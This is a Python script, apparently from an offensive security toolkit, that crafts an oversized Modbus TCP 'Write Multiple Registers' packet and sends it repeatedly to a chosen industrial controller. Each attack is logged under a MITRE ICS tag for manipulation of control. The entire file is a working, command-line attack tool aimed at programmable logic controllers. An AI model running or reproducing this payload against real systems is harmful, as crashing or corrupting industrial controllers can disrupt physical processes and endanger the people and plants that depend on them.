# modules/exploits/modbus_overflow_injector.py

import socket
import argparse
import os
import json
from datetime import datetime

LOG_PATH = "results/exploit_logs.json"
MITRE_TTP = "T0813"  # Manipulation of Control

def log_attack(entry):
    os.makedirs("results", exist_ok=True)
    if os.path.exists(LOG_PATH):
        with open(LOG_PATH, "r") as f:
            data = json.load(f)
    else:
        data = []
    data.append(entry)
    with open(LOG_PATH, "w") as f:
        json.dump(data, f, indent=2)

def craft_malicious_modbus_payload(length=300):
    transaction_id = b'\x00\x01'
    protocol_id = b'\x00\x00'
    unit_id = b'\x01'
    function_code = b'\x10'  # Write Multiple Registers
    payload = b'\x00\x01\x00\x01\x02' + (b'\x41' * length)
    length_field = (len(unit_id + function_code + payload)).to_bytes(2, byteorder='big')
    pdu = transaction_id + protocol_id + length_field + unit_id + function_code + payload
    return pdu

def send_payload(target_ip, port, repeat, payload_len):
    payload = craft_malicious_modbus_payload(length=payload_len)
    for i in range(repeat):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(3)
                s.connect((target_ip, port))
                s.sendall(payload)
                print(f"[âœ“] Exploit payload sent to {target_ip}:{port} (#{i+1})")
        except Exception as e:
            print(f"[!] Connection error: {e}")

    log_attack({
        "timestamp": datetime.utcnow().isoformat(),
        "target": target_ip,
        "port": port,
        "repeat": repeat,
        "payload_len": payload_len,
        "ttp": MITRE_TTP
    })

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Modbus Overflow Injector")
    parser.add_argument("--ip", required=True, help="Target IP")
    parser.add_argument("--port", type=int, default=502, help="Modbus TCP port")
    parser.add_argument("--repeat", type=int, default=1, help="Repeat count")
    parser.add_argument("--payload-len", type=int, default=300, help="Payload size in bytes")
    args = parser.parse_args()

    send_payload(args.ip, args.port, args.repeat, args.payload_len)
